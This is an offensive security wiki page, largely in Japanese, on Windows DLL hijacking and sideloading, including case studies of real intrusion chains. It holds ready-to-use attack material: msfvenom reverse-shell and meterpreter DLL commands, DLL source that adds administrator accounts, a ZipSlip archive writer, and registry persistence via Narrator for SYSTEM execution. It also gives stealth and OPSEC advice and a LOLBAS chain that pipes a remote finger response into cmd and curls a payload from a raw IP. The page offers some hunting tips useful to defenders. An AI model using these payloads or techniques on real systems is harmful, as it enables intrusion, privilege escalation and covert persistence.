# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking は、信頼されたアプリケーションに悪意ある DLL を読み込ませるよう操作することを指します。この用語には、**DLL Spoofing, Injection, Side-Loading** などの複数の手法が含まれます。主に code execution、persistence、そしてそれほど一般的ではない privilege escalation に使われます。ここでは escalation に焦点を当てていますが、hijacking の手法自体は目的が違っても一貫しています。

### Common Techniques

DLL hijacking にはいくつかの方法があり、効果はアプリケーションの DLL 読み込み戦略によって異なります。

1. **DLL Replacement**: 正規の DLL を悪意あるものに差し替える。必要に応じて DLL Proxying を使い、元の DLL の機能を維持する。
2. **DLL Search Order Hijacking**: 悪意ある DLL を、正規のものより先に検索されるパスに置き、アプリケーションの検索順を悪用する。
3. **Phantom DLL Hijacking**: 存在しない必要 DLL だとアプリケーションに思わせて、読み込ませるための悪意ある DLL を作成する。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更し、アプリケーションを悪意ある DLL に誘導する。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内で正規の DLL を悪意あるものに置き換える手法で、DLL side-loading と関連付けられることが多い。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションと一緒に、ユーザーが制御できるディレクトリに悪意ある DLL を置く。Binary Proxy Execution techniques に似ている。


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading は、信頼された **.NET Framework** プロセスに attacker code を読み込ませる唯一の方法ではありません。ターゲットの実行ファイルが **managed** アプリケーションなら、CLR は実行ファイル名に対応する **application configuration file** も参照します（例: `Setup.exe.config`）。そのファイルではカスタム **AppDomainManager** を定義できます。config が EXE の隣に置かれた attacker-controlled assembly を指していると、CLR はそれを**アプリケーションの通常の code path より前に**読み込み、信頼されたプロセス内で実行します。

Microsoft の .NET Framework configuration schema によると、カスタム manager を使うには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が存在する必要があります。

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
実践的な注意点:
- これは **.NET Framework 固有** の tradecraft です。Win32 の DLL search order ではなく、CLR config の解析に依存します。
- ホストは本当に **managed EXE** である必要があります。簡易確認: `sigcheck -m target.exe`, `corflags target.exe`、または PE メタデータ内の **CLR Runtime Header** を確認します。
- config ファイル名は実行ファイル名と完全一致する必要があります（`<binary>.config`）。通常は **EXE の隣** に置かれます。
- これは **signed Microsoft/vendor binaries** と相性が良いです。信頼された EXE 自体は変更せず、悪意ある managed assembly が in-process で実行されます。
- すでに書き込み可能な installer/update ディレクトリがあるなら、AppDomainManager hijacking は **first stage** として使えます。その後の stage では、従来の DLL sideloading や reflective loading に繋げられます。

### 既存の scheduled task を hijack して sideload chain を再実行する

Persistence のために、**新しい task を作成する** ことだけを見ないでください。侵入グループの中には、正規の installer が **通常の updater task** を作成するのを待ち、その後 **task action を書き換えて**、既存の名前、author、trigger が defenders から見て自然なままになるようにするものがあります。

再利用可能なワークフロー:
1. 正規ソフトウェアを install/run し、通常作成される task を特定します。
2. task XML を export して、現在の `<Exec><Command>` / `<Arguments>` の値を確認します。
3. action だけを置き換え、task がユーザー書き込み可能な staging ディレクトリ内の **trusted host EXE** を起動するようにします。その後、その EXE が real payload を side-load または AppDomain-load します。
4. 新しい目立つ persistence artifact を作るのではなく、同じ task 名で再登録します。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Why it is stealthier:
- The task name can still look legitimate (for example a vendor updater).
- The **Task Scheduler service** launches it, so parent/ancestor validation often sees the expected scheduling chain instead of `explorer.exe`.
- DFIR teams that only hunt for **new task names** may miss a task whose registration already existed but whose action now points to `%LOCALAPPDATA%`, `%APPDATA%`, or another attacker-controlled path.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing Dlls の見つけ方

システム内で missing Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルタを設定する**ことです:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

そして **File System Activity** だけを表示します:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

**missing dlls 全般**を探している場合は、これを**数秒間**そのまま動かします。\
特定の実行ファイル内の**missing dll**を探している場合は、**"Process Name" "contains" `<exec name>` のような別のフィルタを設定し、実行して、イベント収集を停止**します。

## Exploiting Missing Dlls

権限昇格のために最も有効なのは、**特権プロセスが読み込もうとする dll を書き込める**ことです。その dll が検索される**場所のいずれか**に dll を置ければよいのです。したがって、**元の dll** があるフォルダよりも前に検索されるフォルダに dll を**書き込める**場合（特殊なケース）、または、dll が検索されるフォルダのどこかに**書き込めて**、かつ元の **dll** がどのフォルダにも存在しない場合に成立します。

### Dll Search Order

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **では、Dll が具体的にどのように読み込まれるかを確認できます。**

**Windows applications** は、あらかじめ定義された一連の **search paths** に従って DLL を探し、特定の順序で処理します。DLL hijacking の問題は、悪意ある DLL をこれらのディレクトリのいずれかに戦略的に配置することで、本物の DLL より先に読み込ませられるときに発生します。これを防ぐ解決策は、アプリケーションが必要とする DLL を参照するときに絶対パスを使うことです。

32-bit システムでの **DLL search order** は以下のとおりです:

1. アプリケーションが読み込まれたディレクトリ。
2. system directory. このディレクトリのパスを取得するには [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使います。(_C:\Windows\System32_)
3. 16-bit system directory. このディレクトリのパスを取得する関数はありませんが、検索対象にはなります。(_C:\Windows\System_)
4. Windows directory. このディレクトリのパスを取得するには [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使います。
1. (_C:\Windows_)
5. current directory.
6. PATH 環境変数に列挙されたディレクトリ。これは **App Paths** レジストリキーで指定されるアプリケーションごとの path を含まないことに注意してください。**App Paths** キーは DLL search path の計算には使われません。

これが **SafeDllSearchMode** が有効な場合の**既定**の search order です。無効にすると current directory が 2 番目に上がります。これを無効化するには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成して 0 に設定します（既定では有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** とともに呼ばれた場合、search は **LoadLibraryEx** が読み込んでいる実行モジュールのディレクトリから始まります。

最後に、**dll は名前ではなく絶対パスを指定して読み込まれる**ことがある点に注意してください。その場合、その dll は**その path でのみ検索されます**（dll に依存関係がある場合、それらは名前で読み込まれたのと同様に検索されます）。

search order を変更する他の方法もありますが、ここでは説明しません。

### 任意ファイル書き込みを missing-DLL hijack に連鎖させる

1. **ProcMon** フィルタ（`Process Name` = 対象 EXE、`Path` が `.dll` で終わる、`Result` = `NAME NOT FOUND`）を使って、プロセスが探すが見つけられない DLL 名を収集します。
2. バイナリが **schedule/service** 上で動作する場合、そうした名前の DLL を **application directory**（search-order の 1 番目）に置くと、次回実行時に読み込まれます。ある .NET scanner のケースでは、プロセスは本物のコピーを `C:\Program Files\dotnet\fxr\...` から読み込む前に、`C:\samples\app\` で `hostfxr.dll` を探していました。
3. 任意の export を持つ payload DLL（例: reverse shell）を作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. primitive が **ZipSlip-style arbitrary write** なら、展開先ディレクトリを抜ける ZIP エントリを作り、DLL が app folder に置かれるようにします:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. アーカイブを監視対象の inbox/share に配信する; scheduled task が process を再起動すると、malicious DLL がロードされ、service account としてあなたの code が実行される。

### RTL_USER_PROCESS_PARAMETERS.DllPath を使って sideloading を強制する

新しく作成される process の DLL search path を決定的に操作する高度な方法は、ntdll の native APIs を使って process を作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに attacker-controlled な directory を指定すると、import された DLL を名前だけで解決する target process（absolute path を使わず、safe loading flags も使わない）は、その directory から malicious DLL を load するよう強制できます。

Key idea
- RtlCreateProcessParametersEx で process parameters を構築し、制御下の folder（例: dropper/unpacker が置かれている directory）を指す custom DllPath を指定する。
- RtlCreateUserProcess で process を作成する。target binary が DLL を名前で解決するとき、loader は resolution 中にこの supplied DllPath を参照するため、malicious DLL が target EXE と同じ場所になくても reliable に sideloading できる。

Notes/limitations
- これは作成される child process に影響する; current process のみに影響する SetDllDirectory とは異なる。
- target は DLL を名前で import するか LoadLibrary しなければならない（absolute path ではなく、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使わない）。
- KnownDLLs と hardcoded absolute paths は hijack できない。forwarded exports と SxS により優先順位が変わる場合がある。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- 悪意のある xmllite.dll（必要な関数を export するか、real one を proxying する）をあなたの DllPath ディレクトリに配置する。
- 上記の technique を使って、xmllite.dll を名前で参照することが分かっている signed binary を起動する。loader は supplied DllPath を通じて import を解決し、あなたの DLL を sideload する。

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH 内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
また、以下を使って executable の imports と dll の exports を確認することもできます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH 内の任意のフォルダに書き込み権限があるかどうかを確認します。\
この脆弱性を見つける他の興味深い自動ツールは、**PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._ です。

### Example

悪用可能なシナリオを見つけた場合、それを正常に悪用するために最も重要なことの1つは、**実行ファイルがそこから import する全ての関数を少なくとも export する dll を作成すること**です。とはいえ、Dll Hijacking は [Medium Integrity level から High **(bypassing UAC)** へ昇格する](../../authentication-credentials-uac-and-efs/index.html#uac) ため、または[ **High Integrity から SYSTEM** へ](../index.html#from-high-integrity-to-system)**.** ために便利です。**有効な dll を作成する方法** の例は、実行用途の dll hijacking に焦点を当てたこの研究の中にあります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**次のセクション**では、**テンプレート**として使えたり、**必要でない関数だけを export した dll** を作成するのに役立つ、いくつかの**基本的な dll コード**を見つけられます。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本的に **Dll proxy** とは、ロードされたときに**悪意あるコードを実行**できる一方で、**本来のライブラリへ全ての呼び出しを relay することで**、**期待通りに expose** され **動作** する Dll のことです。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、**実行ファイルを指定して proxify したいライブラリを選び、proxified dll を生成**するか、**Dll を指定して proxified dll を生成**できます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する (x86版のみで、x64版は見つかりませんでした):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分の

いくつかのケースでは、コンパイルするDllは、被害者プロセスによって読み込まれる **複数の関数をexport** する必要があります。これらの関数が存在しない場合、**binary はそれらをloadできず**、**exploit は失敗**します。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成付きのC++ DLL例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリ付きの代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を今でも探索し、arbitrary code execution と persistence に悪用できます。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- もし writable な attacker-controlled DLL が OneCore path に存在すれば、それが load され、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。exports は不要です。

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator を start し、上記 path の load 試行を observe します。

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 単純な hijack は UI を読み上げ/強調表示します。静かにするには、attach 時に Narrator の threads を列挙し、main thread を `OpenThread(THREAD_SUSPEND_RESUME)` で開いて `SuspendThread` します。続きは自分の thread で実行してください。完全な code は PoC を参照してください。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記を設定すると、Narrator を起動したときに planted DLL が読み込まれます。secure desktop（logon screen）では、CTRL+WIN+ENTER を押して Narrator を起動します。すると、あなたの DLL が secure desktop 上で SYSTEM として実行されます。

RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer を許可します: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP で host に接続し、logon screen で CTRL+WIN+ENTER を押して Narrator を起動します。すると、あなたの DLL が secure desktop 上で SYSTEM として実行されます。
- RDP session が閉じると実行は停止します。すぐに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- built-in Accessibility Tool (AT) の registry entry（例: CursorIndicator）を clone し、任意の binary/DLL を指すように編集して import し、その後 `configuration` をその AT 名に設定できます。これにより、Accessibility framework の下で任意の execution を proxy できます。

Notes
- `%windir%\System32` への書き込みと HKLM 値の変更には admin 権限が必要です。
- すべての payload logic は `DLL_PROCESS_ATTACH` に置けます。exports は不要です。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. スケジュールされたタスクが、現在のユーザーのコンテキストで 9:30 AM に実行されるのを待つ。
3. タスク実行時に管理者がログインしている場合、悪意のある DLL は中程度の整合性で管理者のセッション内で実行される。
4. 標準的な UAC bypass 技術を連鎖させて、中程度の整合性から SYSTEM 権限へ昇格する。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors は、信頼された署名済みプロセスの下で payload を実行するために、MSI ベースの dropper と DLL side-loading を頻繁に組み合わせる。

Chain overview
- ユーザーが MSI をダウンロードする。CustomAction が GUI インストール中にサイレントで実行され（例: LaunchApplication または VBScript action）、埋め込まれた resources から次の stage を再構築する。
- dropper は、正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済み EXE が起動すると、Windows DLL search order により working directory から wsc.dll が最初に読み込まれ、署名済み parent の下で attacker code が実行される（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 実行ファイルまたは VBScript を実行するエントリを探す。例: 背景で埋め込まれた file を実行する LaunchApplication の suspicious pattern。
- Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary tables を確認する。
- MSI CAB 内の埋め込み/split payload:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- または lessmsi を使う: `lessmsi x package.msi C:\out`
- VBScript CustomAction によって連結・復号される複数の小さな fragments を探す。一般的な flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe を使った実践的な sideloading
- 次の2つのファイルを同じフォルダに置く:
- wsc_proxy.exe: 正規の署名付きホスト（Avast）。このプロセスは、自身のディレクトリから名前で wsc.dll を読み込もうとする。
- wsc.dll: 攻撃者の DLL。特定の exports が不要なら、DllMain だけで十分な場合がある。そうでなければ、proxy DLL を作成し、必要な exports を本物のライブラリへ forward しつつ、DllMain で payload を実行する。
- 最小限の DLL payload をビルドする:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- export requirements については、proxying framework（例: DLLirant/Spartacus）を使って、payload も実行する forwarding DLL を生成する。

- この technique は host binary による DLL name resolution に依存する。host が absolute paths や safe loading flags（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使う場合、hijack は失敗する可能性がある。
- KnownDLLs、SxS、forwarded exports は precedence に影響し、host binary と export set の選定時に考慮する必要がある。

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point は、Ink Dragon が ShadowPad を展開する際に、正規 software に紛れ込ませつつ core payload を disk 上で encrypted のまま保つために、**three-file triad** を使っていたと説明した。

1. **Signed host EXE** – AMD、Realtek、NVIDIA などの vendor が悪用される（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は executable を Windows binary に見えるようにリネームする（例: `conhost.exe`）が、Authenticode signature は有効なまま残る。
2. **Malicious loader DLL** – EXE の隣に期待される名前で配置される（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。DLL は通常、ScatterBrain framework で obfuscation された MFC binary で、役割は encrypted blob を見つけ、decrypt し、ShadowPad を reflectively map することだけ。
3. **Encrypted payload blob** – 多くの場合、同じ directory に `<name>.tmp` として保存される。decrypted payload を memory-mapping した後、loader は TMP file を削除して forensic evidence を破壊する。

Tradecraft notes:

* Signed EXE をリネームしつつ（PE header の元の `OriginalFileName` は維持する）ことで、Windows binary であるかのように見せながら vendor signature を保持できる。そのため、Ink Dragon が行っていたように、実際には AMD/NVIDIA utilities である `conhost.exe` 風の binary を配置する手法を再現する。
* executable が trusted のままであるため、ほとんどの allowlisting controls は malicious DLL を横に置くだけで済む。loader DLL のカスタマイズに集中し、signed parent は通常そのまま実行できる。
* ShadowPad の decryptor は、mapping 後に file を zero 化できるよう、TMP blob が loader の隣にあり、かつ writable であることを期待する。payload が memory に載るまでは directory を writable に保ち、その後は OPSEC のために TMP file を安全に削除できる。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operator は DLL sideloading と LOLBAS を組み合わせ、disk 上の custom artifact を trusted EXE の隣にある malicious DLL のみにする:

- **Remote command loader (Finger):** Hidden PowerShell が `cmd.exe /c` を起動し、Finger server から command を取得して `cmd` に渡す:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` は TCP/79 の text を取得し、`| cmd` が server response を実行するため、operator は second stage server-side を切り替えられる。

- **Built-in download/extract:** benign extension の archive を download し、展開して、sideload target と DLL を random な `%LocalAppData%` folder に配置する:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
